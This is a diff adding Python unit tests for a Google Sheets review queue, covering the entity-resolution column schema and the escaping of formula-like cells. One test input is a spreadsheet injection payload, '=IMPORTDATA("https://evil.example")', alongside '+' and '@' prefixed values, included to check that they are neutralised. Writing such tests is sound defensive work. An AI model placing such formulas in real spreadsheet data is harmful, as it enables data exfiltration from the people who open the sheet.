@@ -430,6 +430,93 @@ def test_google_sheet_review_queue_uses_raw_values_and_escapes_formula_cells() -
     assert values[11] == "'\r=1+1"
 
 
+def test_google_sheet_review_queue_publishes_entity_resolution_schema() -> None:
+    service = FakeSheetsService()
+    service.values_obj.get_responses.append({"values": []})
+    queue = GoogleSheetReviewQueue(service=service, spreadsheet_id="sheet_1")
+
+    published = queue.publish_cards(
+        sheet_tab="entity_resolution",
+        rows=[
+            {
+                "event_id": "er_1",
+                "candidate_entity_id": "ent_candidate",
+                "matched_entity_id": "ent_existing",
+                "action": "merge_candidate",
+                "probability": 0.92,
+                "status": "pending_review",
+                "rationale": "domain_match=1.00",
+            }
+        ],
+    )
+
+    assert published == 1
+    assert service.values_obj.update_kwargs["range"] == "entity_resolution!A1:J1"
+    assert service.values_obj.update_body == {
+        "values": [
+            [
+                "event_id",
+                "candidate_entity_id",
+                "matched_entity_id",
+                "action",
+                "probability",
+                "status",
+                "rationale",
+                "decision",
+                "review_memo",
+                "reviewer",
+            ]
+        ]
+    }
+    assert service.values_obj.append_kwargs["range"] == "entity_resolution!A:J"
+    assert service.values_obj.append_kwargs["valueInputOption"] == "RAW"
+    assert service.values_obj.append_body == {
+        "values": [
+            [
+                "er_1",
+                "ent_candidate",
+                "ent_existing",
+                "merge_candidate",
+                0.92,
+                "pending_review",
+                "domain_match=1.00",
+                "",
+                "",
+                "",
+            ]
+        ]
+    }
+
+
+def test_google_sheet_review_queue_escapes_entity_resolution_formula_cells() -> None:
+    service = FakeSheetsService()
+    service.values_obj.get_responses.append({"values": []})
+    queue = GoogleSheetReviewQueue(service=service, spreadsheet_id="sheet_1")
+
+    queue.publish_cards(
+        sheet_tab="entity_resolution",
+        rows=[
+            {
+                "event_id": "er_1",
+                "candidate_entity_id": "=IMPORTDATA(\"https://evil.example\")",
+                "matched_entity_id": "ent_existing",
+                "action": "needs_review",
+                "probability": 0.62,
+                "status": "pending_review",
+                "rationale": "+SUM(1,1)",
+                "decision": "",
+                "review_memo": "@hidden",
+                "reviewer": "",
+            }
+        ],
+    )
+
+    values = service.values_obj.append_body["values"][0]  # type: ignore[index]
+    assert values[1] == "'=IMPORTDATA(\"https://evil.example\")"
+    assert values[6] == "'+SUM(1,1)"
+    assert values[8] == "'@hidden"
+
+
 class FakeGmailMessages:
     def list(self, **kwargs: object) -> "FakeGmailMessages":
         self.list_kwargs = kwargs
